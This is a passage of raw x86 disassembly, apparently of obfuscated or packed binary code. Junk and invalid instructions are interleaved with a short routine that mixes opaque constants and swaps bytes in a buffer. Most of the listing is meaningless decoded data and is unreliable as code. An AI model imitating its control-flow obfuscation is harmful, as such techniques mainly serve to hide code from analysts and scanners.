  40849e:	or     eax,0xcfd2141
  4084a3:	lods   al,BYTE PTR ds:[esi]
  4084a4:	ins    DWORD PTR es:[edi],dx
  4084a5:	outs   dx,BYTE PTR ds:[esi]
  4084a6:	mov    ah,0xda
  4084a8:	add    al,0x75
  4084aa:	pop    ecx
  4084ab:	mov    esi,eax
  4084ad:	(bad)
  4084b0:	int    0xd5
  4084b2:	sar    BYTE PTR [ebx-0x36],0x80
  4084b6:	gs nop
  4084b8:	xchg   esp,eax
  4084b9:	daa    
  4084ba:	icebp  
  4084bb:	nop
  4084bc:	shl    DWORD PTR [edi-0x25],0xcc
  4084c0:	sbb    esi,ebp
  4084c2:	cli    
  4084c3:	call   0x55ccc431
  4084c8:	jg     0x408452
  4084ca:	lahf   
  4084cb:	ja     0x40845d
  4084cd:	sar    BYTE PTR [edx],1
  4084cf:	retf   0xa0c9
  4084d2:	dec    ecx
  4084d3:	lahf   
  4084d4:	fistp  DWORD PTR [eax+0x505d468e]
  4084da:	mov    ebp,0xc6a9f44e
  4084df:	mov    dl,0x6b
  4084e1:	adc    al,0x7e
  4084e3:	inc    ecx
  4084e4:	xchg   esp,eax
  4084e5:	stc    
  4084e6:	dec    ebp
  4084e7:	enter  0xa45b,0xdf
  4084eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084ec:	inc    edi
  4084ed:	push   edx
  4084ee:	cmp    al,0x4d
  4084f0:	test   al,0x9a
  4084f2:	xchg   DWORD PTR [eax-0x4bbce97f],ecx
  4084f8:	inc    ebp
  4084f9:	add    al,0x33
  4084fb:	leave  
  4084fc:	iret   
  4084fd:	int    0x58
  4084ff:	jl     0x408567
  408501:	sti    
  408502:	inc    ebp
  408503:	aam    0x8d
  408505:	cli    
  408506:	nop
  408507:	adc    DWORD PTR [ecx],esi
  408509:	scas   eax,DWORD PTR es:[edi]
  40850a:	xchg   BYTE PTR [edi+0x47],cl
  40850d:	or     dh,BYTE PTR [ebp+0x44]
  408510:	stos   BYTE PTR es:[edi],al
  408511:	in     al,dx
  408512:	sub    ah,bh
  408514:	addr16 cdq 
  408516:	hlt    
  408517:	cmp    DWORD PTR [ebp-0x5788c1fd],ecx
  40851d:	popf   
  40851e:	jne    0x40856a
  408520:	mov    ebp,0x2d31320b
  408525:	sbb    edi,eax
  408527:	add    DWORD PTR [esi+ebx*4+0x35],esp
  40852b:	and    ah,BYTE PTR [ecx-0x75]
  40852e:	push   esp
  40852f:	and    edx,DWORD PTR [ebx]
  408531:	shr    dh,1
  408533:	mov    esp,0xb1118d0b
  408538:	je     0x408585
  40853a:	leave  
  40853b:	cmp    al,0x51
  40853d:	in     eax,0x99
  40853f:	imul   eax,DWORD PTR [ebp-0x31dea22c],0xffffff8c
  408546:	adc    DWORD PTR [edi+0x7d9d627e],esi
  40854c:	sbb    al,0x10
  40854e:	aaa    
  40854f:	push   ecx
  408550:	mov    edi,0xb48925c8
  408555:	xchg   edi,eax
  408556:	scas   eax,DWORD PTR es:[edi]
  408557:	imul   eax,eax,0xdf902917
  40855d:	sti    
  40855e:	js     0x408523
  408560:	int3   
  408561:	dec    esi
  408562:	pop    ds
  408563:	jp     0x4085e3
  408565:	into   
  408566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408567:	popa   
  408568:	sti    
  408569:	pushf  
  40856a:	test   BYTE PTR [edx],ch
  40856c:	xchg   ebx,eax
  40856d:	in     eax,0x96
  40856f:	call   0x9af64c0c
  408574:	dec    ecx
  408575:	test   DWORD PTR [edx],0x9db94af
  40857b:	mov    ds:0xa30a48ea,eax
  408580:	ds inc ebp
  408582:	inc    ecx
  408583:	xchg   edx,eax
  408584:	and    dl,BYTE PTR [esi]
  408586:	jmp    0x4085a1
  408588:	cmp    ebx,edx
  40858a:	ja     0x408598
  408590:	mov    edx,DWORD PTR [ebp-0x34]
  408593:	jmp    0x408770
  408598:	mov    edx,DWORD PTR [ebp-0x3c]
  40859b:	mov    edi,DWORD PTR [ebp-0x4]
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0xc49353f
  4085c4:	imul   edi
  4085c6:	loope  0x40859f
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x4085ec
  4085cf:	push   ecx
  4085d0:	or     DWORD PTR ds:0x68c9c2ea,ebx
  4085d6:	cmp    eax,0x7f84be11
  4085db:	icebp  
  4085dc:	cld    
  4085dd:	dec    ecx
  4085de:	push   edi
  4085df:	push   ebx
  4085e0:	push   edx
  4085e1:	lds    esi,FWORD PTR [ecx-0x486c1d87]
  4085e7:	jb     0x4085c3
  4085e9:	mov    ecx,0xefb64930
  4085ee:	(bad)  
  4085ef:	fcom   DWORD PTR [ecx+0x585cf65]
  4085f5:	cdq    
  4085f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f7:	mov    ah,0x99
  4085f9:	bnd ret 
  4085fb:	inc    eax
  4085fc:	retf   0x3308
  4085ff:	cld    
  408600:	mov    ah,0xe9
  408602:	inc    ecx
  408603:	inc    esp
  408604:	add    DWORD PTR [ecx+0x53],0x1abf2230
  40860b:	ret    
  40860c:	push   edi
  40860d:	jecxz  0x408686
  40860f:	test   DWORD PTR [ebx],edi
  408611:	mul    DWORD PTR ds:0x53a96213
  408617:	xchg   edx,eax
  408618:	push   0xffffffae
  40861a:	mov    bl,0x2c
  40861c:	dec    esp
  40861d:	cdq    
  40861e:	call   0x53a64b50
  408623:	or     BYTE PTR [ecx-0x19779e4],0xbc
  40862a:	iret   
  40862b:	xchg   BYTE PTR [edi-0x7b7fea52],al
  408631:	out    0x29,al
  408633:	mov    esp,0xc8323aa6
  408638:	mov    dl,BYTE PTR [ebx-0x26]
  40863b:	mov    esi,0x3605e7e5
  408640:	mov    ch,0xd6
  408642:	add    BYTE PTR [edx-0x4],al
  408645:	dec    ebp
  408646:	pop    edi
  408647:	jno    0x408665
  408649:	sub    al,ah
  40864b:	stc    
  40864c:	jae    0x40860c
  40864e:	icebp  
  40864f:	scas   eax,DWORD PTR es:[edi]
  408650:	dec    eax
  408651:	xor    DWORD PTR ds:0x2f32a22f,0x19e720be
  40865b:	adc    edx,edx
  40865d:	sti    
  40865e:	dec    esi
  40865f:	adc    esi,ecx
  408661:	outs   dx,DWORD PTR ds:[esi]
  408662:	sub    DWORD PTR [ebx],edx
  408664:	jbe    0x4086dd
  408666:	nop
  408667:	sbb    al,0x74
  408669:	sbb    eax,esp
  40866b:	mov    bh,0x18
  40866d:	mov    ebp,esp
  40866f:	or     al,0xb1
  408671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408672:	fisubr DWORD PTR [edi+0x67ee44]
  408678:	cs inc ecx
  40867a:	jle    0x4086cd
  40867c:	pop    esi
  40867d:	dec    edx
  40867e:	xor    BYTE PTR [edi+eax*4+0x2fca6e31],bh
  408685:	mov    ecx,0x80573b03
  40868a:	ins    BYTE PTR es:[edi],dx
  40868b:	scas   eax,DWORD PTR es:[edi]
  40868c:	push   es
  40868d:	sub    ebp,esi
  40868f:	jmp    0x408706
  408691:	push   ds
  408692:	sub    bh,BYTE PTR [edi+eax*8]
  408695:	fadd   DWORD PTR [esi]
  408697:	pop    ss
  408698:	popf   
  408699:	sbb    al,0xbb
  40869b:	inc    esi
  40869c:	scas   al,BYTE PTR es:[di]
  40869e:	gs push eax
  4086a0:	or     DWORD PTR [edx],esi
  4086a2:	xor    al,0x80
  4086a4:	xchg   BYTE PTR [ecx+eiz*8],dl
  4086a7:	mov    bh,BYTE PTR [edx]
  4086a9:	cdq    
  4086aa:	leave  
  4086ab:	ret    
  4086ac:	cmp    dh,BYTE PTR [eax+edx*1-0x2b]
  4086b0:	jb     0x4086b7
  4086b2:	sub    DWORD PTR [edx],ebx
  4086b4:	and    al,0x9a
  4086b6:	out    0xa3,eax
  4086b8:	cli    
  4086b9:	mov    al,ds:0x1a7ced9f
  4086be:	jp     0x408676
  4086c0:	xor    bh,BYTE PTR [ebx-0x6e]
  4086c3:	daa    
  4086c4:	pop    ebx
  4086c5:	dec    esp
  4086c6:	loopne 0x408747
  4086c8:	ss stos BYTE PTR es:[edi],al
  4086ca:	jbe    0x40869c
  4086cc:	pop    ecx
  4086cd:	fist   DWORD PTR [esi+0x4f]
  4086d0:	lahf   
  4086d1:	loope  0x40870c
  4086d3:	add    DWORD PTR [ebx+0x37],eax
  4086d6:	pop    ebx
  4086d7:	aam    0xb7
  4086d9:	js     0x4086ed
  4086db:	(bad)  
  4086dd:	xchg   ebp,eax
  4086de:	mov    ebp,DWORD PTR [ebp-0x48]
  4086e1:	out    dx,eax
  4086e2:	and    eax,0x485bda5c
  4086e7:	test   BYTE PTR [ecx],al
  4086e9:	clc    
  4086ea:	add    esp,DWORD PTR [esi]
  4086ec:	push   0x58
  4086ee:	retf   0x2fd6
  4086f1:	mov    BYTE PTR [ebp-0x6064eafc],cl
  4086f7:	sbb    al,0xca
  4086f9:	xchg   edx,eax
  4086fa:	imul   ebx,DWORD PTR [esi],0x7efb1f66
  408700:	test   eax,0xd6eef9b6
  408705:	loope  0x408709
  408707:	mov    dl,0xdc
  408709:	ins    DWORD PTR es:[edi],dx
  40870a:	sbb    al,0x32
  40870c:	cdq    
  40870d:	sub    al,0x1
  40870f:	xor    eax,DWORD PTR [ecx+0x269916aa]
  408715:	mov    dl,0x4b
  408717:	xchg   ecx,eax
  408718:	mov    ax,ax
  40871b:	sbb    DWORD PTR [edi],0xd5eb0b46
  408721:	xchg   edx,eax
  408722:	iret   
  408723:	repnz popa 
  408725:	dec    esp
  408726:	sahf   
  408727:	dec    ebx
  408728:	adc    eax,0x4674dfbd
  40872d:	dec    esi
  40872e:	xor    BYTE PTR [edx+0x6d],al
  408731:	cmp    dh,BYTE PTR [edi+0x4c244e2f]
  408737:	std    
  408738:	inc    ebx
  408739:	push   es
  40873a:	sub    eax,0xd2fc1a93
  40873f:	rcl    dh,cl
  408741:	fcom   DWORD PTR [esi]
  408743:	aas    
  408744:	aam    0x3f
  408746:	inc    eax
  408747:	sahf   
  408748:	jo     0x408747
  40874a:	xor    ah,al
  40874c:	(bad)  
  40874d:	ror    BYTE PTR [esi-0x11],cl
  408750:	fimul  DWORD PTR [eax]
  408752:	pop    edx
  408753:	rcl    BYTE PTR [ebp-0x1dd25e27],1
  408759:	sti    
  40875a:	ins    BYTE PTR es:[edi],dx
  40875b:	aaa    
  40875c:	hlt    
  40875d:	cdq    
  40875e:	ds mov esi,0xda3b4aca
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	imul   ebx,DWORD PTR [ecx],0xd57d5607
  40884d:	jle    0x4088cd
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x4087d9
  408854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408855:	popf   
  408856:	xor    ch,BYTE PTR [ebx-0x41]
  408859:	jg     0x408805
  40885b:	retf   
  40885c:	stos   DWORD PTR es:[edi],eax
  40885d:	mov    ecx,ecx
  40885f:	xor    BYTE PTR [edx+0x38],0x7d
  408863:	push   edx
  408864:	xchg   ebp,eax
  408865:	sti    
  408866:	ret    0xc204
  408869:	inc    ebp
  40886a:	in     al,0xd6
  40886c:	stos   DWORD PTR es:[edi],eax
  40886d:	test   ah,bh
  40886f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408870:	push   ebp
  408871:	add    edx,DWORD PTR [edi-0x3f]
  408874:	mov    bh,0x48
  408876:	xchg   ebp,eax
  408877:	jmp    0x7df8e83f
  40887c:	push   ecx
  40887d:	inc    ebp
  40887e:	cmp    BYTE PTR [esp+ecx*4-0x47],0x2f
  408883:	jae    0x408842
  408885:	repz std 
  408887:	nop
  408888:	addr16 inc ebx
  40888a:	sub    BYTE PTR [esi+0x28],dl
  40888d:	and    edi,DWORD PTR [eax]
  40888f:	adc    al,0xdd
  408891:	enter  0x9230,0x6b
  408895:	lds    ecx,FWORD PTR [edx]
  408897:	out    dx,al
  408898:	lock addr16 mov ds:0xdcff,eax
  40889d:	sub    BYTE PTR [edx-0x31],dl
  4088a0:	fwait
  4088a1:	mov    ebx,0x77041daa
  4088a6:	mov    al,0x67
  4088a8:	push   edi
  4088a9:	sub    dh,BYTE PTR [eax]
  4088ab:	inc    ecx
  4088ac:	popa   
  4088ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ae:	(bad)  [edi]
  4088b0:	loope  0x408893
  4088b2:	jg     0x4088bb
  4088b4:	ret    0x17bd
  4088b7:	out    dx,eax
  4088b8:	jo     0x408867
  4088ba:	xor    BYTE PTR [edi-0x75],ch
  4088bd:	out    dx,al
  4088be:	mov    ah,0xb7
  4088c0:	or     al,0xb
  4088c2:	push   cs
  4088c3:	loop   0x40887f
  4088c5:	pop    ebp
  4088c6:	or     ch,BYTE PTR [esi-0x27]
  4088c9:	and    DWORD PTR [edx+0x3d6ee81d],0xffffff99
  4088d0:	lods   al,BYTE PTR ds:[esi]
  4088d1:	popf   
  4088d2:	dec    ecx
  4088d3:	mov    ecx,0xf1e9593f
  4088d8:	pop    eax
  4088d9:	std    
  4088da:	popf   
  4088db:	xchg   ebx,eax
  4088dc:	rcl    BYTE PTR [edx],1
  4088de:	stos   BYTE PTR es:[edi],al
  4088df:	inc    esp
  4088e0:	pop    ds
  4088e1:	(bad)  
  4088e2:	sub    dh,bl
  4088e4:	fxch   st(6)
  4088e6:	pop    DWORD PTR [ebx-0x6b9f8cf9]
  4088ec:	ror    BYTE PTR [edi-0x22603c0a],1
  4088f2:	adc    cl,0x1a
  4088f5:	push   0x706e84e5
  4088fa:	cmp    al,0x4c
  4088fc:	dec    ecx
  4088fd:	sub    al,0xca
  4088ff:	test   DWORD PTR [esi],0xd6f0f1f6
  408905:	and    al,0x97
  408907:	bound  ecx,QWORD PTR [eax]
  408909:	jo     0x40893c
  40890b:	cmp    bh,al
  40890d:	add    al,0xe4
  40890f:	dec    esi
  408910:	loop   0x40894d
  408912:	loopne 0x40890c
  408914:	push   cs
  408915:	and    dl,ah
  408917:	inc    ebx
  408918:	pop    edi
  408919:	pop    ebx
  40891a:	rcr    DWORD PTR [ebx+eax*2-0x21],0xbe
  40891f:	(bad)  
  408920:	imul   ebx,DWORD PTR [ebp+0x6c],0xa118ab4
  408927:	imul   edx,esp,0xcb79ce00
  40892d:	(bad)  [ebx-0x5c]
  408930:	fdiv   DWORD PTR [edx]
  408932:	mov    ah,0xe2
  408934:	aam    0x96
  408936:	fisub  WORD PTR [ebp-0x69a51c84]
  40893c:	and    bl,BYTE PTR [esi-0x80]
  40893f:	les    eax,FWORD PTR ds:0x74a7c1f7
  408945:	inc    ebp
  408946:	push   cs
  408947:	push   esi
  408948:	pop    ebx
  408949:	adc    DWORD PTR [ecx+0x48f9489f],esi
  40894f:	ins    BYTE PTR es:[edi],dx
  408950:	fwait
  408951:	(bad)  
  408952:	fst    DWORD PTR [esi-0x4f]
  408955:	mov    WORD PTR [ebx],?
  408957:	push   ss
  408958:	shr    dh,cl
  40895a:	mov    ah,0xfe
  40895c:	xchg   ebp,eax
  40895d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40895e:	add    eax,0x21008451
  408963:	cmp    dl,BYTE PTR [esi+0x77]
  408966:	inc    ecx
  408967:	pop    edx
  408968:	sub    al,0xa
  40896a:	fwait
  40896b:	inc    edi
  40896c:	inc    esp
  40896d:	and    eax,DWORD PTR [edx]
  40896f:	bound  esi,QWORD PTR [ebx]
  408971:	sub    eax,DWORD PTR gs:[ebx+0x37]
  408975:	sbb    BYTE PTR [ecx-0xb],dl
  408978:	add    edi,esp
  40897a:	jl     0x408903
  40897c:	xchg   ecx,eax
  40897d:	inc    ebp
  40897e:	inc    ebp
  40897f:	xor    DWORD PTR [edi],ecx
  408981:	pop    eax
  408982:	sub    al,0xe2
  408984:	cmp    edx,DWORD PTR [edx]
  408986:	or     BYTE PTR [ecx+0x3e],bh
  408989:	dec    edx
  40898a:	stos   DWORD PTR es:[edi],eax
  40898b:	mov    ds,ebx
  40898d:	daa    
  40898e:	popf   
  40898f:	mov    al,0x53
  408991:	sbb    ecx,ebp
  408993:	xchg   edi,eax
  408994:	ins    DWORD PTR es:[edi],dx
  408995:	pop    eax
  408996:	dec    edx
  408997:	dec    ebp
  408998:	and    al,0xd2
  40899a:	ret    
  40899b:	aam    0xb
  40899d:	test   BYTE PTR [esi+0x6a],bh
  4089a0:	fldenv [esi+0x2]
  4089a3:	enter  0x2bcd,0xf8
  4089a7:	test   BYTE PTR [ecx+0x65dec694],ch
  4089ad:	retf   0x7219
  4089b0:	mov    WORD PTR [edx-0x36ed9b53],?
  4089b6:	repz inc eax
  4089b8:	mov    ch,0xe3
  4089ba:	and    eax,0xaf267aab
  4089bf:	jge    0x408a12
  4089c1:	add    BYTE PTR [edx-0x2eeb6bd8],bl
  4089c7:	jmp    0x40896f
  4089c9:	mov    ecx,0xe5c14983
  4089ce:	pop    ds
  4089cf:	inc    ebp
  4089d0:	cmp    al,0x88
  4089d2:	icebp  
  4089d3:	mov    ch,0x92
  4089d5:	adc    DWORD PTR [ebx+0x448ae5dc],ebp
  4089db:	and    BYTE PTR [edi+eax*1+0x7c3238c7],ah
  4089e2:	adc    edx,DWORD PTR [eax+edx*2-0x7d]
  4089e6:	inc    esp
  4089e7:	xor    edi,eax
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	mov    ebx,fs
  408a08:	add    al,BYTE PTR [ebp+0x7e7ed289]
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x408a72
  408a13:	out    dx,al
  408a14:	and    al,BYTE PTR [ecx+0x5e]
  408a17:	push   ss
  408a18:	xor    al,0xbd
  408a1a:	ret    0xabf9
  408a1d:	and    DWORD PTR [eax+esi*4+0x4c],0x98bce23f
  408a25:	(bad)  
  408a26:	(bad)  
  408a27:	sub    eax,0x3cc84bc0
  408a2c:	pop    ebx
  408a2d:	cmc    
  408a2e:	and    BYTE PTR [eax],dl
  408a30:	or     BYTE PTR ds:0x51611716,bh
  408a36:	mov    esi,0xbb03e564
  408a3b:	mov    ebx,0x1f41da2e
  408a40:	push   ss
  408a41:	mov    ecx,0xdbb11093
  408a46:	xor    DWORD PTR [esi+0x152a7ff0],ebp
  408a4c:	gs fwait
  408a4e:	xchg   ecx,eax
  408a4f:	and    ah,BYTE PTR [edi+eiz*1]
  408a52:	out    dx,eax
  408a53:	mov    ebp,esp
  408a55:	nop
  408a56:	rcr    BYTE PTR [edi],0xa2
  408a59:	stos   DWORD PTR es:[edi],eax
  408a5a:	add    eax,0x2024f700
  408a5f:	add    al,0x23
  408a61:	jl     0x408a59
  408a63:	push   edx
  408a64:	adc    edi,edx
  408a66:	int3   
  408a67:	(bad)  
  408a68:	dec    esi
  408a69:	mov    edx,0xac076b96
  408a6e:	xor    DWORD PTR [ecx+ebp*1],0xdb420b03
  408a75:	mov    dl,0xca
  408a77:	rcr    DWORD PTR [esi],0x1a
  408a7a:	xchg   esp,eax
  408a7b:	inc    ecx
  408a7c:	adc    eax,eax
  408a7e:	shl    BYTE PTR [esi+edx*2+0x60],0x6c
  408a83:	stos   BYTE PTR es:[edi],al
  408a84:	popf   
  408a85:	xchg   BYTE PTR [edx+0x4fb6e0e3],bl
  408a8b:	dec    edx
  408a8c:	scas   al,BYTE PTR es:[edi]
  408a8d:	ja     0x408a2c
  408a8f:	jnp    0x408a28
  408a91:	hlt    
  408a92:	push   esp
  408a93:	mov    al,ss:0xdc7334fb
  408a99:	bound  eax,QWORD PTR [ecx]
  408a9b:	push   edi
  408a9c:	shr    DWORD PTR [esp+eax*2-0x55],cl
  408aa0:	pop    esp
  408aa1:	data16 daa 
  408aa3:	xchg   ebp,ebx
  408aa5:	and    DWORD PTR [edx+0x74],0x764750f1
  408aac:	jnp    0x408b0b
  408aae:	mov    DWORD PTR [edx+ebp*4],esp
  408ab1:	ds (bad) 
  408ab3:	pop    edx
  408ab4:	xchg   ecx,eax
  408ab5:	fbld   TBYTE PTR [ebp-0x74ad1898]
  408abb:	jge    0x408a6d
  408abd:	push   0xffffff88
  408abf:	add    bh,dh
  408ac1:	outs   dx,DWORD PTR ds:[esi]
  408ac2:	add    DWORD PTR [eax],esi
  408ac4:	dec    eax
  408ac5:	pushf  
  408ac6:	mov    dl,0x86
  408ac8:	mov    dl,0xd6
  408aca:	test   eax,0x584d4ff0
  408acf:	mov    ds,ebp
  408ad1:	mov    edx,0xe0d69ed0
  408ad6:	sub    al,0x60
  408ad8:	inc    ecx
  408ad9:	out    dx,al
  408ada:	and    ebp,DWORD PTR [edx-0xc]
  408add:	pop    ds
  408ade:	xchg   ebx,eax
  408adf:	cmc    
  408ae0:	fistp  QWORD PTR [ebx-0x5a]
  408ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae4:	in     al,dx
  408ae5:	xchg   ebp,eax
  408ae6:	das    
  408ae7:	es (bad) 
  408ae9:	cwde   
  408aea:	in     al,0xde
  408aec:	lock inc eax
  408aee:	xor    ebx,esp
  408af0:	sub    eax,0xaffb460f
  408af5:	sbb    al,0x3b
  408af7:	fist   DWORD PTR [edi-0x4a4a6833]
  408afd:	sahf   
  408afe:	shr    BYTE PTR [eax-0x1f72bd42],cl
  408b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b05:	inc    ebp
  408b06:	nop
  408b07:	mov    ds:0x165a4e8b,al
  408b0c:	mov    ebp,0x803968a6
  408b11:	int    0x41
  408b13:	pushfw 
  408b15:	cmp    ebx,DWORD PTR [edi+0xe]
  408b18:	jl     0x408aec
  408b1a:	sub    eax,0xebcda7fe
  408b1f:	les    esi,FWORD PTR [ebp+ecx*1+0x24f11dd6]
  408b26:	cmp    esi,DWORD PTR [edx+0x3a]
  408b29:	pusha  
  408b2a:	xchg   ecx,eax
  408b2b:	into   
  408b2c:	xor    al,0x3d
  408b2e:	sbb    ah,bh
  408b30:	mov    eax,0x41c03c28
  408b35:	sub    ebx,esi
  408b37:	dec    edx
  408b38:	gs dec ecx
  408b3a:	inc    ebp
  408b3b:	adc    BYTE PTR [edx-0xa],bh
  408b3e:	jno    0x408b82
  408b40:	push   edx
  408b41:	jle    0x408af9
  408b43:	ja     0x408b59
  408b45:	(bad)  
  408b46:	jmp    0x408b0f
  408b48:	(bad)  
  408b49:	sti    
  408b4a:	ficom  DWORD PTR [edi-0x45]
  408b4d:	dec    edi
  408b4e:	xchg   ebp,eax
  408b4f:	lds    edi,FWORD PTR [ecx]
  408b51:	push   0xffffffcd
  408b53:	mov    edi,0xaa103a7e
  408b58:	daa    
  408b59:	inc    ebp
  408b5a:	outs   dx,BYTE PTR ds:[esi]
  408b5b:	in     eax,dx
  408b5c:	jb     0x408b67
  408b5e:	out    0xd7,eax
  408b60:	cld    
  408b61:	loop   0x408ae3
  408b63:	test   BYTE PTR [ebx+0x39],ah
  408b66:	adc    BYTE PTR [ebx+0x56],dl
  408b69:	jle    0x408b44
  408b6b:	es push esi
  408b6d:	and    al,0x11
  408b6f:	inc    eax
  408b70:	mov    DWORD PTR [edx-0x27],ebp
  408b73:	stc    
  408b74:	scas   al,BYTE PTR es:[edi]
  408b75:	push   ebx
  408b76:	sbb    ah,BYTE PTR [ebx]
  408b78:	hlt    
  408b79:	int    0xac
  408b7b:	jnp    0x408b15
  408b7d:	and    cl,bl
  408b7f:	in     eax,dx
  408b80:	mov    ch,0x40
  408b82:	test   bl,ch
  408b84:	mov    edx,0x212b427a
  408b89:	sub    dl,BYTE PTR [ecx+0xb]
  408b8c:	mov    eax,ds:0xa7a1d2f4
  408b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b92:	or     cl,BYTE PTR [edi]
  408b94:	leave  
  408b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b96:	and    DWORD PTR [eax],esp
  408b98:	sub    bh,BYTE PTR [eax]
  408b9a:	outs   dx,DWORD PTR ds:[esi]
  408b9b:	fbld   TBYTE PTR [eax+0x3f]
  408b9e:	pushf  
  408b9f:	sbb    cl,dh
  408ba1:	xor    esi,edx
  408ba3:	jnp    0x408b70
  408ba5:	mov    esp,0x9b1fbc8d
  408baa:	jb     0x408bde
  408bac:	add    BYTE PTR [ebx],bh
  408bae:	cli    
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	daa    
  408bd9:	push   0xd025bcf8
  408bde:	jle    0x408c5e
  408be0:	mov    bh,BYTE PTR [edi+0x7e]
  408be3:	jle    0x408bc0
  408be5:	mov    al,ds:0x83e3ee4f
  408bea:	imul   ebx,DWORD PTR [edi],0xffffffc3
  408bed:	ss mov esi,DWORD PTR fs:[ebp+0x107a35e9]
  408bf5:	cdq    
  408bf6:	fdiv   QWORD PTR [ecx-0x2d]
  408bf9:	push   0x4a
  408bfb:	jne    0x408c2d
  408bfd:	iret   
  408bfe:	in     al,0x9e
  408c00:	jmp    0x3a6edebe
  408c05:	add    dh,bh
  408c07:	add    al,0x94
  408c09:	stos   DWORD PTR es:[edi],eax
  408c0a:	inc    edi
  408c0b:	push   ds
  408c0c:	rcr    eax,cl
  408c0e:	adc    eax,0x330b81f0
